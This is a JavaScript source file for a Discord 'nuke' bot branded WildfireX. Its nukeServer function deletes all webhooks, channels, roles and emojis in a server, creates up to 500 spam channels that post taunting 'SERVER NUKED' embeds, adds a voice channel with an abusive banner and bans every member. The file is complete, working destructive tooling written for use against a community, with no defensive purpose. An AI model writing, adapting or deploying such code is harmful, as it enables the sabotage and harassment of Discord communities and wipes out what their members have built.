// src/commands/nuke.js
// Core nuke logic — exported as plain async functions.

import { EmbedBuilder, ChannelType } from 'discord.js';

// ─── Build the nuke announcement embed (posted in spam text channels) ─────────
export function buildNukeEmbed(channelName) {
  return new EmbedBuilder()
    .setColor(0xff0000)
    .setTitle('💥 SERVER NUKED')
    .setDescription('This server has been nuked by WildfireX')
    .addFields(
      { name: 'Channel Name', value: channelName, inline: false },
      { name: 'Nuked By',     value: 'your dad',  inline: false },
      {
        name: 'Timestamp',
        value: new Date().toLocaleString('en-GB', {
          weekday: 'long', year: 'numeric', month: 'long',
          day: 'numeric', hour: '2-digit', minute: '2-digit',
        }),
        inline: false,
      },
    )
    .setFooter({ text: 'WildfireX Security' });
}

// ─── Build the VC nuke announcement embed (posted in the voice channel chat) ──
export function buildVcNukeEmbed() {
  return new EmbedBuilder()
    .setColor(0xff0000)
    .setTitle('WILDFIRE HAS LANDED')
    .setDescription('This server has been reduced to **ash** by **WildfireX**.')
    .addFields(
      { name: 'Status',    value: '`NUKED — TOTAL ANNIHILATION`', inline: false },
      { name: 'Authority', value: 'WildfireX Devastation',        inline: true  },
      { name: 'Position',  value: '`Wildfire Base — VC`',         inline: true  },
      {
        name: 'Timestamp',
        value: new Date().toLocaleString('en-IN', {
          weekday: 'long', year: 'numeric', month: 'long',
          day: 'numeric', hour: '2-digit', minute: '2-digit',
          timeZone: 'Asia/Kolkata',
        }),
        inline: false,
      },
    )
    .setFooter({ text: 'WildfireX — Your server is now fucked.' })
    .setTimestamp();
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
async function runAll(tasks) {
  const results   = await Promise.allSettled(tasks);
  const succeeded = results.filter((r) => r.status === 'fulfilled').length;
  const failed    = results.filter((r) => r.status === 'rejected').length;
  return { succeeded, failed };
}

// ─── Main wipe logic ──────────────────────────────────────────────────────────
/**
 * Wipes a Discord guild: webhooks → channels → roles → emojis → VC (opt) → spam channels → bans.
 *
 * @param {import('discord.js').Guild} guild            Target guild.
 * @param {string}                    botId             Bot's own user ID (skipped during bans).
 * @param {number}                    channelsToCreate  Total channels to create (VC counts as 1).
 * @param {string}                    channelName       Name for spam channels.
 * @param {boolean}                   createVc          Whether to create a Voice Channel at the top.
 * @param {string}                    vcName            Name for the Voice Channel.
 * @returns {Promise<{ log: string[], vcChannel: import('discord.js').VoiceChannel | null }>}
 */
export async function nukeServer(
  guild,
  botId,
  channelsToCreate = 0,
  channelName      = 'nuked',
  createVc         = false,
  vcName           = 'wildfire-base',
) {
  const log = [];
  let vcChannel = null;

  // 1. Webhooks
  {
    const channels     = guild.channels.cache.filter(
      (c) => c.isTextBased && typeof c.fetchWebhooks === 'function',
    );
    const webhookTasks = [];
    for (const ch of channels.values()) {
      const hooks = await ch.fetchWebhooks().catch(() => null);
      if (hooks) hooks.forEach((wh) => webhookTasks.push(wh.delete().catch(() => {})));
    }
    const { succeeded, failed } = await runAll(webhookTasks);
    log.push(`🪝 **Webhooks** — deleted \`${succeeded}\`, failed \`${failed}\``);
  }

  // 2. Channels
  {
    const tasks = guild.channels.cache.map((ch) => ch.delete().catch(() => {}));
    const { succeeded, failed } = await runAll(tasks);
    log.push(`📢 **Channels** — deleted \`${succeeded}\`, failed \`${failed}\``);
  }

  // 3. Roles (skip @everyone and roles above the bot)
  {
    const botMember  = await guild.members.fetch(botId);
    const botTopRole = botMember.roles.highest.position;
    const roles = guild.roles.cache.filter(
      (r) => r.id !== guild.id && r.position < botTopRole,
    );
    const tasks = roles.map((r) => r.delete().catch(() => {}));
    const { succeeded, failed } = await runAll(tasks);
    log.push(`🎭 **Roles** — deleted \`${succeeded}\`, failed \`${failed}\``);
  }

  // 4. Emojis
  {
    const tasks = guild.emojis.cache.map((e) => e.delete().catch(() => {}));
    const { succeeded, failed } = await runAll(tasks);
    log.push(`😀 **Emojis** — deleted \`${succeeded}\`, failed \`${failed}\``);
  }

  // 5. Spam channels creation + post nuke embed in each
  //    VC (if requested) is created AFTER these so it ends up at the top.
  const textCount = createVc ? Math.max(channelsToCreate - 1, 0) : channelsToCreate;
  if (textCount > 0) {
    const count      = Math.min(textCount, 500);
    const embed      = buildNukeEmbed(channelName);
    const createTasks = Array.from({ length: count }, async () => {
      try {
        const ch = await guild.channels.create({ name: channelName });
        if (ch && typeof ch.send === 'function') {
          await ch.send({ embeds: [embed] }).catch(() => {});
        }
      } catch { /* ignore */ }
    });
    const results   = await Promise.allSettled(createTasks);
    const succeeded = results.filter((r) => r.status === 'fulfilled').length;
    const failed    = results.filter((r) => r.status === 'rejected').length;
    log.push(`📣 **Spam Channels Created** — \`${succeeded}\` created, failed \`${failed}\``);
  }

  // 6. Voice Channel creation (if requested) — created LAST so position 0 places it first
  if (createVc) {
    try {
      vcChannel = await guild.channels.create({
        name: vcName,
        type: ChannelType.GuildVoice,
        position: 0,
      });
      await vcChannel.setPosition(0, { relative: false }).catch(() => {});
      // Post the nuke embed in the VC's built-in text chat
      await vcChannel.send({ embeds: [buildVcNukeEmbed()] }).catch(() => {});
      log.push(`🔊 **Voice Channel** — \`${vcChannel.name}\` created at top`);
    } catch (err) {
      log.push(`🔊 **Voice Channel** — failed: \`${err.message}\``);
    }
  }

  // 7. Members — BAN ALL (including bots), skip the bot itself only
  {
    let membersFetched = true;
    await guild.members.fetch().catch((err) => {
      console.warn('[nuke] Could not fetch members:', err.message);
      membersFetched = false;
    });

    if (membersFetched) {
      const members = guild.members.cache.filter((m) => m.id !== botId);
      const tasks   = members.map((m) =>
        m.ban({ reason: 'Server nuke' }).catch(() => {}),
      );
      const { succeeded, failed } = await runAll(tasks);
      log.push(
        `🔨 **Members Banned** — \`${succeeded}\` banned (including bots), failed \`${failed}\``,
      );
    } else {
      log.push('⚠️ **Members** — Skipped (Server Members Intent not enabled in Developer Portal).');
    }
  }

  return { log, vcChannel };
}
